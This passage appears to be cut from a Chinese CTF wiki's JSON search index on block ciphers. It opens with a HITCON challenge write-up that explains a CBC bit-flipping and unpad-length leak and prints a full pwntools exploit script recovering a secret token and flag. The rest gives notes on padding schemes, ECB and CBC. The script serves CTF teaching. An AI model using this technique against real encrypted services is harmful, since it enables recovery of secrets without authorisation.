unpad\uff0c\u8fd9\u4e2a\u5b57\u8282\u662f\u6839\u636e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u51b3\u5b9a\u7684\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd9\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u77e5\u9053\u4e00\u4e2a\u5b57\u8282\u7684\u503c\u3002\n\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u6df1\u5165\u5206\u6790\u4e00\u4e0b unpad \u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u5982\u679c\u6211\u4eec\u5c06\u52a0\u5bc6 IV \u548c \nencrypt(md5(token[:i]))\n \u653e\u5728\u67d0\u4e2a\u5bc6\u6587 C \u7684\u540e\u9762\uff0c\u6784\u6210 \nC|IV|encrypt(md5(token[:i]))\n\uff0c\u90a3\u4e48\u89e3\u5bc6\u51fa\u6765\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u5c31\u662f \nmd5(token[:i])\n\u3002\u8fdb\u800c\uff0c\u5728 unpad \u7684\u65f6\u5019\u5c31\u662f\u5229\u7528 \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff08 0-255\uff09\u8fdb\u884c unpad\uff0c\u4e4b\u540e\u5bf9 unpad \u540e\u7684\u5b57\u7b26\u4e32\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff08\u6bd4\u5982md5\uff09\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\n\u4e8b\u5148\u6784\u9020\u4e00\u4e9b\u6d88\u606f\u54c8\u5e0c\u540e\u52a0\u5bc6\u7684\u6837\u672c\n\uff0c\u7136\u540e\u5c06\u4e0a\u8ff0\u6267\u884c\u540e\u7684\u7ed3\u679c\u4e0e\u6837\u672c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a \nmd5(token[:i])\n \u7684\n\u6700\u540e\u4e00\u4e2a\u5b57\u8282\n\u3002\u7136\u800c\uff0c\u5982\u679c \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e16\uff0c\u90a3\u4e48\u5728 unpad \u65f6\u5c31\u4f1a\u5229\u7528\u4e00\u4e9b md5 \u4e2d\u7684\u503c\uff0c\u800c\u8fd9\u90e8\u5206\u503c\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0d\u540c\u957f\u5ea6\u7684 \ntoken[:i]\n \u51e0\u4e4e\u90fd\u4e0d\u4f1a\u76f8\u540c\u3002\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u7279\u6b8a\u5904\u7406\u3002\n\n\n\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\uff0c\u5373\u751f\u6210\u4e0e unpad \u5b57\u8282\u5927\u5c0f\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u6837\u672c\uff0c\u4ee5\u4fbf\u4e8e\u67e5\u8868\u3002\n\n\n\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u7ed5\u8fc7 proof of work\u3002\n\n\n\u83b7\u53d6 token \u52a0\u5bc6\u540e\u7684\u7ed3\u679c \ntoken_enc\n \uff0c\u8fd9\u91cc\u4f1a\u5728 token \u524d\u9762\u6dfb\u52a0 7 \u4e2a\u5b57\u8282 \ntoken: \n \u3002 \u56e0\u6b64\u52a0\u5bc6\u540e\u7684\u957f\u5ea6\u4e3a 64\u3002\n\n\n\u4f9d\u6b21\u83b7\u53d6 \nencrypt(md5(token[:i]))\n \u7684\u7ed3\u679c\uff0c\u4e00\u5171\u662f 57 \u4e2a\uff0c\u5305\u62ec\u6700\u540e\u4e00\u4e2a token \u7684 padding\u3002\n\n\n\u6784\u9020\u4e0e unpad \u5927\u5c0f\u5bf9\u5e94\u7684\u6837\u672c\u3002\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u5bc6\u6587 \ntoken_enc|padding|IV_indexi|welcome_enc\n\u3002\u7531\u4e8e \nIV_indexi\n \u662f\u4e3a\u4e86\u4fee\u6539\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8be5\u5b57\u8282\u5904\u4e8e\u53d8\u5316\u4e4b\u4e2d\u3002\u6211\u4eec\u82e5\u60f3\u83b7\u53d6\u4e00\u4e9b\u56fa\u5b9a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u90e8\u5206\u81ea\u7136\u4e0d\u80fd\u6dfb\u52a0\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea7\u751f\u6837\u672c\u65f6 unpad \u7684\u5927\u5c0f\u8303\u56f4\u4e3a 17 ~ 255\u3002\u5982\u679c\u6700\u540e\u6d4b\u8bd5\u65f6 \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e17\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e9b\u672a\u77e5\u7684\u6837\u672c\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u662f\u6211\u4eec\u76f4\u63a5\u83b7\u53d6 255-17+1\u4e2a\u8fd9\u4e48\u591a\u4e2a\u6837\u672c\uff0c\u7136\u800c\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u6839\u636e\u4e0a\u9762 340 \u7684\u6b21\u6570\uff08255-17+1+57+56\n340\uff09\u9650\u5236\uff0c\u6211\u4eec\u663e\u7136\u4e0d\u80fd\u83b7\u53d6\u5230 token \u7684\u6240\u6709\u5b57\u8282\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u590d\u7528\u4e00\u4e9b\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u590d\u7528  \nencrypt(md5(token[:i]))\n  \u7684\u7ed3\u679c\u3002\u90a3\u4e48\u6211\u4eec\u5728\u8865\u5145 padding \u65f6\u9700\u8981\u786e\u4fdd\u4e00\u65b9\u9762\u6b21\u6570\u591f\u7528\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u7ed3\u679c\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e unpad \u7684\u5faa\u73af\u4e3a 17 \u5230 208\uff0c\u5e76\u4f7f\u5f97 unpad \u5927\u4e8e 208 \u65f6\u6070\u597d unpad \u5230\u6211\u4eec\u53ef\u4ee5\u590d\u7528\u7684\u5730\u65b9\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53 \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a 0 \u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u89e3\u5bc6\u540e\u7684\u660e\u6587 unpad \u6389\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 command not found \u7684\u5bc6\u6587\u3002\n\n\n\u518d\u6b21\u6784\u9020\u5bc6\u6587 \ntoken_enc|padding|IV|encrypt(md5(token[:i]))\n \uff0c\u90a3\u4e48\uff0c\u89e3\u5bc6\u65f6\u5373\u4f7f\u7528 \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c unpad\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u4e0d\u5c0f\u4e8e17\u6216\u8005\u4e3a0\uff0c\u5219\u53ef\u4ee5\u5904\u7406\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u5c0f\u4e8e17\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u6700\u540e\u8fd4\u56de\u7ed9\u7528\u6237\u7684 md5 \u7684\u7ed3\u679c\u5e76\u4e0d\u5728\u6837\u672c\u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6211\u4eec\u4fee\u6539\u5176\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u6bd4\u7279\u4f4d\uff0c\u4f7f\u5176 unpad \u540e\u53ef\u4ee5\u843d\u5728\u6837\u672c\u8303\u56f4\u5185\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u731c\u51fa \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\n\n\n\u5728\u731c\u51fa \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u66b4\u529b\u7834\u89e3 256 \u6b21\uff0c\u627e\u51fa\u6240\u6709\u54c8\u5e0c\u503c\u672b\u5c3e\u4e3a \nmd5(token[:i])\n \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002\n\n\n\u4f46\u662f\uff0c\u5728\u7b2c\u516d\u6b65\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a \nmd5(token[:i])\n  \u53ef\u80fd\u4f1a\u627e\u51fa\u591a\u4e2a\u5907\u9009\u5b57\u7b26\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u5f97\u5176\u672b\u5c3e\u5b57\u8282\u662f\u7ed9\u5b9a\u5b57\u8282\u5373\u53ef\u3002\n\n\n\u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5982\u4f55\u5220\u9664\u4e00\u4e9b\u591a\u4f59\u7684\u5907\u9009\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u91cc\u6211\u5c31\u9009\u62e9\u4e86\u4e00\u4e2a\u5c0f trick\uff0c\u5373\u5728\u9010\u5b57\u8282\u679a\u4e3e\u65f6\uff0c\u540c\u65f6\u679a\u4e3e\u51fa token \u7684 padding\u3002\u7531\u4e8e padding \u662f 0x01 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fc7\u6ee4\u51fa\u6240\u6709\u7ed3\u5c3e\u4e0d\u662f 0x01 \u7684token \u5373\u53ef\u3002\n\n\n\n\n\u8fd9\u91cc\uff0c\u5728\u6d4b\u8bd5\u65f6\uff0c\u5c06\u4ee3\u7801\u4e2d \nsleep\n \u6ce8\u91ca\u6389\u4e86\u3002\u4ee5\u4fbf\u4e8e\u52a0\u5feb\u4ea4\u4e92\u901f\u5ea6\u3002\u5229\u7528\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nimport\n \nbase64\n,\n \ntime\n,\n \nrandom\n,\n \nstring\n\n\nfrom\n \nCrypto.Cipher\n \nimport\n \nAES\n\n\nfrom\n \nCrypto.Hash\n \nimport\n \nSHA256\n,\n \nMD5\n\n\n#context.log_level = \ndebug\n\n\n\np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\n\n\ndef\n \nstrxor\n(\nstr1\n,\n \nstr2\n):\n\n    \nreturn\n \n.\njoin\n([\nchr\n(\nord\n(\nc1\n)\n \n^\n \nord\n(\nc2\n))\n \nfor\n \nc1\n,\n \nc2\n \nin\n \nzip\n(\nstr1\n,\n \nstr2\n)])\n\n\n\n\ndef\n \npad\n(\nmsg\n):\n\n    \npad_length\n \n=\n \n16\n \n-\n \nlen\n(\nmsg\n)\n \n%\n \n16\n\n    \nreturn\n \nmsg\n \n+\n \nchr\n(\npad_length\n)\n \n*\n \npad_length\n\n\n\n\ndef\n \nunpad\n(\nmsg\n):\n\n    \nreturn\n \nmsg\n[:\n-\nord\n(\nmsg\n[\n-\n1\n])]\n  \n# remove pad\n\n\n\n\ndef\n \nflipplain\n(\noldplain\n,\n \nnewplain\n,\n \niv\n):\n\n    \nflip oldplain to new plain, return proper iv\n\n    \nreturn\n \nstrxor\n(\nstrxor\n(\noldplain\n,\n \nnewplain\n),\n \niv\n)\n\n\n\n\ndef\n \nbypassproof\n():\n\n    \np\n.\nrecvuntil\n(\nSHA256(XXXX+\n)\n\n    \nlastdata\n \n=\n \np\n.\nrecvuntil\n(\n)\n,\n \ndrop\n=\nTrue\n)\n\n    \np\n.\nrecvuntil\n(\n == \n)\n\n    \ndigest\n \n=\n \np\n.\nrecvuntil\n(\n\\n\nGive me XXXX:\n,\n \ndrop\n=\nTrue\n)\n\n\n    \ndef\n \nproof\n(\ns\n):\n\n        \nreturn\n \nSHA256\n.\nnew\n(\ns\n \n+\n \nlastdata\n)\n.\nhexdigest\n()\n \n==\n \ndigest\n\n\n    \ndata\n \n=\n \npwnlib\n.\nutil\n.\niters\n.\nmbruteforce\n(\n\n        \nproof\n,\n \nstring\n.\nascii_letters\n \n+\n \nstring\n.\ndigits\n,\n \n4\n,\n \nmethod\n=\nfixed\n)\n\n    \np\n.\nsendline\n(\ndata\n)\n\n\n\n\ndef\n \nsendmsg\n(\niv\n,\n \ncipher\n):\n\n    \npayload\n \n=\n \niv\n \n+\n \ncipher\n\n    \npayload\n \n=\n \nbase64\n.\nb64encode\n(\npayload\n)\n\n    \np\n.\nsendline\n(\npayload\n)\n\n\n\n\ndef\n \nrecvmsg\n():\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \ndata\n \n=\n \nbase64\n.\nb64decode\n(\ndata\n)\n\n    \nreturn\n \ndata\n[:\n16\n],\n \ndata\n[\n16\n:]\n\n\n\n\ndef\n \ngetmd5enc\n(\ni\n,\n \ncipher_token\n,\n \ncipher_welcome\n,\n \niv\n):\n\n    \nreturn encrypt( md5( token[:i+1] ) )\n\n    \n## keep iv[7:] do not change, so decrypt msg[7:] won\nt change\n\n    \nget_md5_iv\n \n=\n \nflipplain\n(\ntoken: \n.\nljust\n(\n16\n,\n \n\\x00\n),\n \nget-md5\n.\nljust\n(\n\n        \n16\n,\n \n\\x00\n),\n \niv\n)\n\n    \npayload\n \n=\n \ncipher_token\n\n    \n## calculate the proper last byte number\n\n    \nlast_byte_iv\n \n=\n \nflipplain\n(\n\n        \npad\n(\nWelcome!!\n),\n\n        \na\n \n*\n \n15\n \n+\n \nchr\n(\nlen\n(\ncipher_token\n)\n \n+\n \n16\n \n+\n \n16\n \n-\n \n(\n7\n \n+\n \ni\n \n+\n \n1\n)),\n \niv\n)\n\n    \npayload\n \n+=\n \nlast_byte_iv\n \n+\n \ncipher_welcome\n\n    \nsendmsg\n(\nget_md5_iv\n,\n \npayload\n)\n\n    \nreturn\n \nrecvmsg\n()\n\n\n\n\ndef\n \nget_md5_token_indexi\n(\niv_encrypt\n,\n \ncipher_welcome\n,\n \ncipher_token\n):\n\n    \nmd5_token_idxi\n \n=\n \n[]\n\n    \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\ncipher_token\n)\n \n-\n \n7\n):\n\n        \nlog\n.\ninfo\n(\nidx i: {}\n.\nformat\n(\ni\n))\n\n        \n_\n,\n \nmd5_indexi\n \n=\n \ngetmd5enc\n(\ni\n,\n \ncipher_token\n,\n \ncipher_welcome\n,\n \niv_encrypt\n)\n\n        \nassert\n \n(\nlen\n(\nmd5_indexi\n)\n \n==\n \n32\n)\n\n        \n# remove the last 16 byte for padding\n\n        \nmd5_token_idxi\n.\nappend\n(\nmd5_indexi\n[:\n16\n])\n\n    \nreturn\n \nmd5_token_idxi\n\n\n\n\ndef\n \ndoin\n(\nunpadcipher\n,\n \nmd5map\n,\n \ncandidates\n,\n \nflag\n):\n\n    \nif\n \nunpadcipher\n \nin\n \nmd5map\n:\n\n        \nlastbyte\n \n=\n \nmd5map\n[\nunpadcipher\n]\n\n    \nelse\n:\n\n        \nlastbyte\n \n=\n \n0\n\n    \nif\n \nflag\n \n==\n \n0\n:\n\n        \nlastbyte\n \n^=\n \n0x80\n\n    \nnewcandidates\n \n=\n \n[]\n\n    \nfor\n \nx\n \nin\n \ncandidates\n:\n\n        \nfor\n \nc\n \nin\n \nrange\n(\n256\n):\n\n            \nif\n \nMD5\n.\nnew\n(\nx\n \n+\n \nchr\n(\nc\n))\n.\ndigest\n()[\n-\n1\n]\n \n==\n \nchr\n(\nlastbyte\n):\n\n                \nnewcandidates\n.\nappend\n(\nx\n \n+\n \nchr\n(\nc\n))\n\n    \ncandidates\n \n=\n \nnewcandidates\n\n    \nprint\n \ncandidates\n\n    \nreturn\n \ncandidates\n\n\n\n\ndef\n \nmain\n():\n\n    \nbypassproof\n()\n\n\n    \n# result of encrypted Welcome!!\n\n    \niv_encrypt\n,\n \ncipher_welcome\n \n=\n \nrecvmsg\n()\n\n    \nlog\n.\ninfo\n(\ncipher welcome is : \n \n+\n \ncipher_welcome\n)\n\n\n    \n# execute get-token\n\n    \nget_token_iv\n \n=\n \nflipplain\n(\npad\n(\nWelcome!!\n),\n \npad\n(\nget-token\n),\n \niv_encrypt\n)\n\n    \nsendmsg\n(\nget_token_iv\n,\n \ncipher_welcome\n)\n\n    \n_\n,\n \ncipher_token\n \n=\n \nrecvmsg\n()\n\n    \ntoken_len\n \n=\n \nlen\n(\ncipher_token\n)\n\n    \nlog\n.\ninfo\n(\ncipher token is : \n \n+\n \ncipher_token\n)\n\n\n    \n# get command not found cipher\n\n    \nsendmsg\n(\niv_encrypt\n,\n \ncipher_welcome\n)\n\n    \n_\n,\n \ncipher_notfound\n \n=\n \nrecvmsg\n()\n\n\n    \n# get encrypted(token[:i+1]),57 times\n\n    \nmd5_token_idx_list\n \n=\n \nget_md5_token_indexi\n(\niv_encrypt\n,\n \ncipher_welcome\n,\n\n                                              \ncipher_token\n)\n\n    \n# get md5map for each unpadsize, 209-17 times\n\n    \n# when upadsize\n208, it will unpad ciphertoken\n\n    \n# then we can reuse\n\n    \nmd5map\n \n=\n \ndict\n()\n\n    \nfor\n \nunpadsize\n \nin\n \nrange\n(\n17\n,\n \n209\n):\n\n        \nlog\n.\ninfo\n(\nget unpad size {} cipher\n.\nformat\n(\nunpadsize\n))\n\n        \nget_md5_iv\n \n=\n \nflipplain\n(\ntoken: \n.\nljust\n(\n16\n,\n \n\\x00\n),\n \nget-md5\n.\nljust\n(\n\n            \n16\n,\n \n\\x00\n),\n \niv_encrypt\n)\n\n        \n## padding 16*11 bytes\n\n        \npadding\n \n=\n \n16\n \n*\n \n11\n \n*\n \na\n\n        \n## calculate the proper last byte number, only change the last byte\n\n        \n## set last_byte_iv = iv_encrypted[:15] | proper byte\n\n        \nlast_byte_iv\n \n=\n \nflipplain\n(\n\n            \npad\n(\nWelcome!!\n),\n\n            \npad\n(\nWelcome!!\n)[:\n15\n]\n \n+\n \nchr\n(\nunpadsize\n),\n \niv_encrypt\n)\n\n        \ncipher\n \n=\n \ncipher_token\n \n+\n \npadding\n \n+\n \nlast_byte_iv\n \n+\n \ncipher_welcome\n\n        \nsendmsg\n(\nget_md5_iv\n,\n \ncipher\n)\n\n        \n_\n,\n \nunpadcipher\n \n=\n \nrecvmsg\n()\n\n        \nmd5map\n[\nunpadcipher\n]\n \n=\n \nunpadsize\n\n\n    \n# reuse encrypted(token[:i+1])\n\n    \nfor\n \ni\n \nin\n \nrange\n(\n209\n,\n \n256\n):\n\n        \ntarget\n \n=\n \nmd5_token_idx_list\n[\n56\n \n-\n \n(\ni\n \n-\n \n209\n)]\n\n        \nmd5map\n[\ntarget\n]\n \n=\n \ni\n\n\n    \ncandidates\n \n=\n \n[\n]\n\n    \n# get the byte token[i], only 56 byte\n\n    \nfor\n \ni\n \nin\n \nrange\n(\ntoken_len\n \n-\n \n7\n):\n\n        \nlog\n.\ninfo\n(\nget token[{}]\n.\nformat\n(\ni\n))\n\n        \nget_md5_iv\n \n=\n \nflipplain\n(\ntoken: \n.\nljust\n(\n16\n,\n \n\\x00\n),\n \nget-md5\n.\nljust\n(\n\n            \n16\n,\n \n\\x00\n),\n \niv_encrypt\n)\n\n        \n## padding 16*11 bytes\n\n        \npadding\n \n=\n \n16\n \n*\n \n11\n \n*\n \na\n\n        \ncipher\n \n=\n \ncipher_token\n \n+\n \npadding\n \n+\n \niv_encrypt\n \n+\n \nmd5_token_idx_list\n[\ni\n]\n\n        \nsendmsg\n(\nget_md5_iv\n,\n \ncipher\n)\n\n        \n_\n,\n \nunpadcipher\n \n=\n \nrecvmsg\n()\n\n        \n# already in or md5[token[:i]][-1]=\n\\x00\n\n        \nif\n \nunpadcipher\n \nin\n \nmd5map\n \nor\n \nunpadcipher\n \n==\n \ncipher_notfound\n:\n\n            \ncandidates\n \n=\n \ndoin\n(\nunpadcipher\n,\n \nmd5map\n,\n \ncandidates\n,\n \n1\n)\n\n        \nelse\n:\n\n            \nlog\n.\ninfo\n(\nunpad size 1-16\n)\n\n            \n# flip most significant bit of last byte to move it in a good range\n\n            \ncipher\n \n=\n \ncipher\n[:\n-\n17\n]\n \n+\n \nstrxor\n(\ncipher\n[\n-\n17\n],\n \n\\x80\n)\n \n+\n \ncipher\n[\n-\n16\n:]\n\n            \nsendmsg\n(\nget_md5_iv\n,\n \ncipher\n)\n\n            \n_\n,\n \nunpadcipher\n \n=\n \nrecvmsg\n()\n\n            \nif\n \nunpadcipher\n \nin\n \nmd5map\n \nor\n \nunpadcipher\n \n==\n \ncipher_notfound\n:\n\n                \ncandidates\n \n=\n \ndoin\n(\nunpadcipher\n,\n \nmd5map\n,\n \ncandidates\n,\n \n0\n)\n\n            \nelse\n:\n\n                \nlog\n.\ninfo\n(\noh my god,,,, it must be in...\n)\n\n                \nexit\n()\n\n    \nprint\n \nlen\n(\ncandidates\n)\n\n    \n# padding 0x01\n\n    \ncandidates\n \n=\n \nfilter\n(\nlambda\n \nx\n:\n \nx\n[\n-\n1\n]\n \n==\n \nchr\n(\n0x01\n),\n \ncandidates\n)\n\n    \n# only 56 bytes\n\n    \ncandidates\n \n=\n \n[\nx\n[:\n-\n1\n]\n \nfor\n \nx\n \nin\n \ncandidates\n]\n\n    \nprint\n \nlen\n(\ncandidates\n)\n\n    \nassert\n \n(\nlen\n(\ncandidates\n[\n0\n])\n \n==\n \n56\n)\n\n\n    \n# check-token\n\n    \ncheck_token_iv\n \n=\n \nflipplain\n(\n\n        \npad\n(\nWelcome!!\n),\n \npad\n(\ncheck-token\n),\n \niv_encrypt\n)\n\n    \nsendmsg\n(\ncheck_token_iv\n,\n \ncipher_welcome\n)\n\n    \np\n.\nrecvuntil\n(\nGive me the token!\n\\n\n)\n\n    \np\n.\nsendline\n(\nbase64\n.\nb64encode\n(\ncandidates\n[\n0\n]))\n\n    \nprint\n \np\n.\nrecv\n()\n\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nmain\n()\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n...\n\n79\n\n\n1\n\nhitcon\n{\nuNp@d_M3th0D_i5_am4Z1n9!\n}\n\n\n\n\n\n\u53c2\u8003\u94fe\u63a5\n\n\n\n\n\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f\n \n\n\nhttps://en.wikipedia.org/wiki/Padding_oracle_attack\n\n\nhttp://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf\n\n\nhttps://ctftime.org/writeup/7975\n\n\nhttps://ctftime.org/writeup/7974", 
            "title": "\u5206\u7ec4\u6a21\u5f0f"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_1", 
            "text": "\u5206\u7ec4\u52a0\u5bc6\u4f1a\u5c06\u660e\u6587\u6d88\u606f\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u6bcf\u5757\u660e\u6587\u5206\u522b\u5728\u5bc6\u94a5\u63a7\u5236\u4e0b\u52a0\u5bc6\u4e3a\u5bc6\u6587\u3002\u5f53\u7136\u5e76\u4e0d\u662f\u6bcf\u4e2a\u6d88\u606f\u90fd\u662f\u76f8\u5e94\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u586b\u5145\u3002", 
            "title": "\u5206\u7ec4\u6a21\u5f0f"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_2", 
            "text": "\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u5728\u5206\u7ec4\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u7684\u957f\u5ea6\u5f80\u5f80\u5e76\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u9700\u8981\u8fdb\u884c padding\uff0c\u800c\u5982\u4f55 padding \u76ee\u524d\u4e5f\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u7684\u89c4\u5b9a\u3002  \u5e38\u89c1\u7684  \u586b\u5145\u89c4\u5219  \u5982\u4e0b\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u6d88\u606f\u7684\u957f\u5ea6\u662f\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u4ecd\u7136\u9700\u8981\u586b\u5145\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5728\u89e3\u5bc6\u4e4b\u540e\u53d1\u73b0 Padding \u4e0d\u6b63\u786e\uff0c\u5219\u5f80\u5f80\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6211\u4eec\u4e5f\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053 Paddig \u662f\u5426\u6b63\u786e\u3002", 
            "title": "\u5e38\u89c1\u586b\u5145\u89c4\u5219"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#pad-with-bytes-all-of-the-same-value-as-the-number-of-padding-bytes-pkcs5-padding", 
            "text": "\u4e3e\u4f8b\u5b50\u5982\u4e0b  DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 05 05 05 05 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40", 
            "title": "Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#pad-with-0x80-followed-by-zero-bytes-oneandzeroes-padding", 
            "text": "\u4e3e\u4f8b\u5b50\u5982\u4e0b  DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 80 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40  \u8fd9\u91cc\u5176\u5b9e\u5c31\u662f\u548c md5 \u548c sha1 \u7684 padding \u5dee\u4e0d\u591a\u3002", 
            "title": "Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#pad-with-zeroes-except-make-the-last-byte-equal-to-the-number-of-padding-bytes", 
            "text": "\u4e3e\u4f8b\u5b50\u5982\u4e0b  DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8", 
            "title": "Pad with zeroes except make the last byte equal to the number of padding bytes"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#pad-with-zero-null-characters", 
            "text": "\u4e3e\u4f8b\u5b50\u5982\u4e0b  DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75", 
            "title": "Pad with zero (null) characters"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#pad-with-spaces", 
            "text": "\u4e3e\u4f8b\u5b50\u5982\u4e0b  DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 20 20 20 20 20\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25", 
            "title": "Pad with spaces"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#ecb", 
            "text": "ECB\u6a21\u5f0f\u5168\u79f0\u4e3a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f\uff08Electronic codebook\uff09\u3002", 
            "title": "ECB"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_3", 
            "text": "", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_4", 
            "text": "", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_5", 
            "text": "\u540c\u6837\u7684\u660e\u6587\u5757\u4f1a\u88ab\u52a0\u5bc6\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757", 
            "title": "\u7f3a\u70b9"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#cbc", 
            "text": "CBC\u5168\u79f0\u4e3a\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5\uff08Cipher-block chaining\uff09 \u6a21\u5f0f\u3002", 
            "title": "CBC"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_6", 
            "text": "", 
